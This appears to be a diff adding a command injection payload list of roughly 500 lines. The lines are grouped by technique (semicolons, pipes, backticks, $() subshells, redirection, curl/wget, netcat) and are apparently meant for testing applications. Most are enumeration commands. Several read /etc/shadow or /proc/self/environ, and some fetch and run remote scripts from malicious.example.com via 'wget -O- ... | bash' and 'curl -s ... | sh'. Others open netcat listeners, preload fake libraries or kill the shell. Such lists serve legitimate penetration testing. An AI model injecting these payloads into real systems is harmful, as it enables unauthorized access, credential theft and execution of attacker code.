@@ -1,0 +1,511 @@
+################################################################################
+# BASIC COMMANDS (Enumeration, Common Checks)
+################################################################################
+cat /etc/passwd
+cat /etc/shadow
+whoami
+id
+uname -a
+hostname
+ls -l
+ls -la
+pwd
+ifconfig
+ip a
+netstat -an
+uptime
+ps aux
+env
+echo $PATH
+echo $HOME
+echo $SHELL
+date
+touch testfile_injection
+rm testfile_injection
+pwd; ls
+pwd && ls
+pwd || ls
+
+################################################################################
+# SEMICOLON (;) INJECTIONS
+################################################################################
+; ls
+; ls -la
+; cat /etc/passwd
+; cat /etc/shadow
+; uname -a
+; whoami
+; id
+; ps aux
+; env
+; netstat -an
+; ifconfig
+; ip a
+; echo "Injected via semicolon"
+; ping -c 1 127.0.0.1
+; cd /tmp; ls -l
+; rm /tmp/tmp_inject 2>/dev/null; touch /tmp/tmp_inject
+; cat /proc/version
+; cat /proc/meminfo
+; apt-get update
+; apt-get upgrade
+
+################################################################################
+# AMPERSAND (&) / LOGICAL OPERATOR: Single and Double
+################################################################################
+& ls
+& cat /etc/passwd
+& whoami
+& echo "Injected"
+& ping -c 1 127.0.0.1
+&& ls
+&& cat /etc/passwd
+&& cat /etc/shadow
+&& echo "Double ampersand injection"
+&& whoami
+&& id
+&& ps aux
+&& netstat -an
+&& echo "Done with injection"
+&& cd /tmp && ls
+&& ifconfig
+&& ip a
+&& rm -f test_inject.txt
+
+################################################################################
+# PIPE (|) & MULTIPLE PIPES
+################################################################################
+| ls
+| cat /etc/passwd
+| cat /etc/shadow
+| whoami
+| uname -a
+| echo "Pipe injection"
+| ping -c 1 127.0.0.1
+| netstat -an
+| cd /tmp
+| id
+| env
+ls | cat
+ls -la | grep etc
+cat /etc/passwd | wc -l
+echo "test" | tee /tmp/test_inject
+echo "test" | sha256sum
+ls | base64
+ls | xargs echo
+echo "HelloPipe" | sed 's/Hello/Bye/'
+echo "hello" | tr 'a-z' 'A-Z'
+cat /proc/cpuinfo | head -n 5
+
+################################################################################
+# DOUBLE PIPE (||) / OR LOGIC
+################################################################################
+|| ls
+|| cat /etc/passwd
+|| whoami
+|| uname -a
+|| echo "Double pipe injection"
+|| id
+|| netstat -an
+|| ip a
+|| ifconfig
+|| echo "end"
+pwd || ls
+cd /doesnotexist || echo "failed cd, but this ran"
+false || echo "previous command was false, so this runs"
+true || echo "this won't run, because true short-circuits"
+ls /nonexistent || ls /etc
+ls /fakepath || ls /tmp
+ping -c 1 127.0.0.1 || echo "ping might fail"
+id || echo "id didn't run"
+cat /etc/shadow || echo "You don't have permission"
+uname -m || echo "No arch info"
+
+################################################################################
+# BACKTICKS (``) INJECTIONS
+################################################################################
+`ls`
+`cat /etc/passwd`
+`cat /etc/shadow`
+`whoami`
+`uname -a`
+`hostname`
+`pwd`
+`echo HelloFromBackticks`
+`touch /tmp/backtick_inject && ls -l /tmp/backtick_inject`
+`rm /tmp/backtick_inject`
+`id`
+`ps aux`
+`netstat -an`
+`ifconfig`
+`ip a`
+`date`
+`env`
+`uptime`
+`which ls`
+
+################################################################################
+# $() SUBSHELL INJECTIONS
+################################################################################
+$(ls)
+$(cat /etc/passwd)
+$(cat /etc/shadow)
+$(pwd)
+$(whoami)
+$(uname -a)
+$(hostname)
+$(id)
+$(echo "HelloFromSubshell")
+$(ps aux)
+$(netstat -an)
+$(ifconfig)
+$(ip a)
+$(touch /tmp/subshell && ls /tmp/subshell)
+$(rm /tmp/subshell)
+$(env)
+$(uptime)
+$(date)
+$(which ls)
+$(cd / && ls -l)
+
+################################################################################
+# CHAINED COMMAND EXAMPLES
+################################################################################
+cat /etc/passwd; cat /etc/shadow
+whoami; id; uname -a
+pwd; ls -la; date
+env; ps aux; netstat -an
+ifconfig; ip a; echo "Chained injection"
+cd /tmp; ls; echo "In /tmp now"
+cd /; ls -l; echo "Back to root"
+ls; cat /proc/version; uptime
+echo 1 > /tmp/chain_test; cat /tmp/chain_test; rm /tmp/chain_test
+touch /tmp/chain_file; chmod 777 /tmp/chain_file; rm /tmp/chain_file
+mkdir /tmp/chain_dir; cd /tmp/chain_dir; pwd; cd ..; rmdir chain_dir
+ping -c 1 127.0.0.1; ifconfig
+netstat -an; ps aux | grep ssh
+cat /etc/passwd; ls /root 2>/dev/null
+cat /etc/issue; uname -r
+cp /etc/passwd /tmp/passwd_copy; ls -l /tmp/passwd_copy
+rm /tmp/passwd_copy; echo "Cleanup"
+echo "End of chain sample 1"; echo "End of chain sample 2"; echo "End"
+whoami; groups; id
+cat /dev/null; date; free -m
+
+################################################################################
+# REDIRECTIONS AND FILE CREATION
+################################################################################
+ls > /tmp/output_injection
+ls 2> /tmp/error_injection
+ls &> /tmp/all_injection
+echo "RedirectTest" > /tmp/redirect_test
+cat /tmp/redirect_test
+echo "Another line" >> /tmp/redirect_test
+cat /tmp/redirect_test | wc -l
+id >> /tmp/redirect_test
+rm /tmp/redirect_test
+cat /etc/passwd > /tmp/passwd_copy
+cat /tmp/passwd_copy
+rm /tmp/passwd_copy
+uname -a | tee /tmp/tee_output
+rm /tmp/tee_output
+touch /tmp/redirect_file && echo "test" > /tmp/redirect_file
+cat /tmp/redirect_file; rm /tmp/redirect_file
+df -h >> /tmp/df_injection
+du -sh /etc >> /tmp/df_injection
+cat /tmp/df_injection
+rm /tmp/df_injection
+ls 1> /tmp/ls_stdout 2> /tmp/ls_stderr
+rm /tmp/ls_stdout /tmp/ls_stderr 2>/dev/null
+
+################################################################################
+# WGET/CURL & NETWORK TESTS
+################################################################################
+wget http://malicious.example.com/payload.sh
+wget -O- http://malicious.example.com/payload.sh | bash
+curl http://malicious.example.com/payload.sh
+curl -s http://malicious.example.com/payload.sh | sh
+wget http://localhost/test
+curl http://127.0.0.1/
+curl -I https://www.example.com/
+wget -qO- http://127.0.0.1:8080/
+curl -X POST -d "data=inject" http://127.0.0.1/data
+curl -s http://malicious.example.com | tee /tmp/evil_out
+rm /tmp/evil_out
+wget http://192.168.0.100/testfile
+wget -P /tmp/ http://example.com/index.html
+curl --head http://example.com/
+wget -r http://example.com/
+curl ftp://anonymous:anonymous@ftp.example.com
+wget ftp://user:pass@ftp.example.com
+wget http://test:80/ --limit-rate=20k
+curl -L http://some-redirect.example.com/
+curl -A "EvilScanner/1.0" http://example.com
+curl -H "X-Forwarded-For: 127.0.0.1" http://example.com
+
+################################################################################
+# PING & NETWORK UTILITIES
+################################################################################
+ping -c 1 127.0.0.1
+ping -c 3 google.com
+ping -b -c 1 192.168.1.255
+ping6 -c 1 ::1
+traceroute 8.8.8.8
+tracert 8.8.8.8
+nslookup example.com
+dig example.com
+arp -a
+route -n
+ip neigh
+mtr --report 8.8.8.8
+fping 127.0.0.1
+nmap 127.0.0.1
+nmap -sV 127.0.0.1
+nmap -p 22,80,443 127.0.0.1
+hping3 -c 1 127.0.0.1
+ping -c 1 localhost; ping -c 1 127.0.0.1
+hostname -I
+ifconfig eth0
+ip link show
+ip route show
+
+################################################################################
+# COMBINATIONS WITH & AND ;
+################################################################################
+ls & cat /etc/passwd
+cat /etc/shadow & whoami
+uname -a & hostname
+id & ps aux
+ifconfig & netstat -an
+pwd & ls & echo "Chained with &"
+ps aux; whoami; uname -a
+echo "Hello"; echo "World"; echo "Again"
+cat /etc/hosts; cat /etc/resolv.conf
+env; date; uptime
+echo "Combining" & echo "commands"
+rm /tmp/file1; rm /tmp/file2
+touch /tmp/f1; touch /tmp/f2 & ls /tmp/f1 /tmp/f2
+cd / && ls & cd /tmp && ls
+echo "done" & echo "with combination"
+ping -c 1 127.0.0.1 && echo "Ping success"
+ping -c 1 nonexistent.host || echo "Ping fail fallback"
+whoami; groups
+id; groups
+cat /proc/uptime; cat /proc/loadavg
+
+################################################################################
+# TRIVIAL NO-OPs & ECHO TESTS
+################################################################################
+echo "testing injection"
+echo "hello world"
+echo "foo" | grep f
+echo "bar" | grep b
+echo $USER
+echo $UID
+echo $HOSTNAME
+echo "User is $(whoami)"
+echo "Date is `date`"
+echo "ID is $(id)"
+echo
+echo "-----"
+echo "INJECTION TEST COMPLETE"
+true
+false
+:
+exit 0
+exit 1
+[ -f /etc/passwd ] && echo "passwd exists"
+[ -d /etc ] && echo "etc is directory"
+[ -e /bin/ls ] && echo "ls exists"
+[ -n "$SHELL" ] && echo "shell var not empty"
+test -f /etc/shadow && echo "shadow file found"
+
+################################################################################
+# ADVANCED /dev/ & PROC
+################################################################################
+cat /dev/random | head -c 10
+cat /dev/urandom | head -c 16 | base64
+cat /proc/cpuinfo | grep "model name"
+cat /proc/meminfo | grep MemTotal
+cat /proc/version
+cat /proc/1/cmdline
+cat /proc/self/environ
+ls /proc | head -n 20
+strace -c echo "Hello" 2>/dev/null
+ltrace -c echo "Hello" 2>/dev/null
+dd if=/dev/zero of=/tmp/zero_test bs=1 count=10
+hexdump -C /tmp/zero_test
+rm /tmp/zero_test
+ls -l /dev/pts
+ls -l /dev/shm
+mount | grep tmpfs
+lsblk
+df -h
+du -sh /usr
+ls /sys/kernel
+cd /sys && ls
+
+################################################################################
+# SLEEP, BACKGROUND, MISC
+################################################################################
+sleep 1
+sleep 5
+sleep 0.5
+(true) &
+(echo "Async job") &
+bash -c "echo 'subshell in bash -c command'"
+sh -c "echo 'subshell in sh -c command'"
+ls -R / > /dev/null &
+cat /etc/hosts > /dev/null &
+echo "Done with background processes"
+bg
+fg
+kill -9 $$
+kill -TERM $$
+kill -STOP $$
+nohup sleep 10 &
+disown
+jobs
+time ls
+time sleep 1
+type ls
+type type
+help cd
+echo $RANDOM
+echo $PWD
+export TESTVAR=InjectionTest
+
+################################################################################
+# MISC COMMANDS (NETCAT, SOCAT, ETC)
+################################################################################
+nc -l 12345
+nc localhost 12345
+nc -v google.com 80
+nc -zv 127.0.0.1 22
+echo "GET / HTTP/1.0" | nc 127.0.0.1 80
+socat TCP-LISTEN:12345,reuseaddr,fork SYSTEM:'/bin/cat'
+telnet 127.0.0.1 23
+rpcinfo -p localhost
+ftp ftp.example.com
+curl tftp://192.168.0.1/test
+nc -w 2 127.0.0.1 25
+openssl s_client -connect google.com:443
+openssl enc -aes-256-cbc -salt -in /etc/passwd -out /tmp/passwd.enc -k secret
+openssl enc -aes-256-cbc -d -in /tmp/passwd.enc -out /tmp/passwd.dec -k secret
+rm /tmp/passwd.enc /tmp/passwd.dec
+wget --spider http://example.com
+curl -v telnet://127.0.0.1:23
+timeout 2 nc -vz 127.0.0.1 22
+tcpdump -c 5 -i lo
+arping -c 2 192.168.0.1
+
+################################################################################
+# CHAINED EXOTIC EXAMPLES
+################################################################################
+cat /etc/passwd && (sleep 1; echo "Done sleeping")
+(echo "start") | (cat -n)
+(echo "X" ; echo "Y") | sort
+(ls /etc; cd /tmp; ls) 2>/dev/null
+(echo "Multiline" && echo "example") | grep Multi
+(echo "First" && echo "Second") || echo "Should not run"
+cat <<EOF
+This is a here-document
+Injected line
+EOF
+cat <<EOT | grep inj
+Testing
+injection
+EOT
+( whoami; id; uname -a ) | grep "Linux"
+touch /tmp/AAA; chmod 000 /tmp/AAA; ls -l /tmp/AAA; rm /tmp/AAA
+(true && false) || echo "true and false gave us false"
+(true && true) && echo "both true"
+wget -O - http://example.com/index.html | grep Example
+for i in 1 2 3; do echo "Loop $i"; done
+while read line; do echo "Got: $line"; done < /etc/hostname
+seq 1 5 | xargs -n1 echo "Num"
+(echo "Nested $(echo "Double nested")") 
+printf "Test injection\n"
+
+################################################################################
+# ENVIRONMENT VARIABLE / PATH MANIPULATION
+################################################################################
+PATH=/usr/local/bin:/usr/bin:/bin
+SHELL=/bin/bash
+IFS=$'\n'
+IFS=,
+IFS=' '
+HOME=/tmp
+export PATH
+export HOME
+export SHELL
+echo $PATH
+echo $HOME
+echo $SHELL
+echo $IFS | hexdump -C
+(cd / && echo $PWD)
+( cd /tmp && echo $PWD )
+LD_PRELOAD=/tmp/fake_libc.so ls
+LD_LIBRARY_PATH=/tmp/fake_lib
+chroot /tmp /bin/bash
+unset PATH && ls
+unset SHELL && echo $SHELL
+env | sort
+printenv
+declare -x NEWVAR=123
+echo $NEWVAR
+alias ll='ls -la'
+ll
+
+################################################################################
+# COMPLEX LOGICAL COMBINATIONS (&&, ||, |, ; in single line)
+################################################################################
+ls -l ; uname -a && whoami || echo "Combining logic ops"
+cat /etc/shadow || cat /etc/passwd && echo "One succeeded"
+echo "Testing" | grep T && echo "Found T" || echo "Not found T"
+ping -c 1 google.com && echo "Ping success" || echo "Ping fail"
+(pwd; ls) | grep -i etc
+ls /fake || ls / && echo "Fallback"
+date && ( uname -r ; echo "Kernel info" )
+true && false && echo "Will never see me"
+false || echo "This is a fallback for false"
+false || true && echo "Chained fallback"
+cat /notfound ; echo "this won't stop us" ; echo "continuing"
+id && groups && echo "Done ID groups"
+hostname && whoami; cd / && pwd
+cd /tmp || cd /var && ls
+ps aux | head -n 2 || echo "PS failed?"
+ls ; echo "Line after ls" && echo "Another line" || echo "No"
+(echo "Block1" ; echo "Block2") && (echo "Block3" ; echo "Block4")
+ls -l | (grep bin && echo "found bin") || echo "didn't find bin"
+cat /etc/passwd | (grep root && echo "root found" || echo "root missing")
+pwd && cd /tmp && pwd && cd /var && pwd
+true && true || echo "Should not see me"
+( sleep 1 ; echo "Slept 1" ) && echo "Done sleeping"
+
+################################################################################
+# MISCELLANEOUS FINAL LINES
+################################################################################
+cat /etc/services | grep http
+lsof -i :80
+history
+bash --version
+sh --version
+zsh --version
+ls -la /home
+ls -la /root 2>/dev/null
+cat /etc/group | head -n 10
+head -n 10 /etc/passwd
+tail -n 5 /var/log/syslog 2>/dev/null
+logger "Testing command injection logger"
+echo $((1+2))
+expr 3 + 5
+bc <<< "10*5"
+yes "InjectedLine" | head -n 5
+perl -e 'print "Perl Injection\n"'
+python -c 'print("Python Injection")'
+php -r 'echo "PHP Injection\n";'
+ruby -e 'puts "Ruby Injection"'
+lua -e 'print("Lua Injection")'
+lsmod | head -n 5
+echo "Done with 500+ expanded command injection tests!"
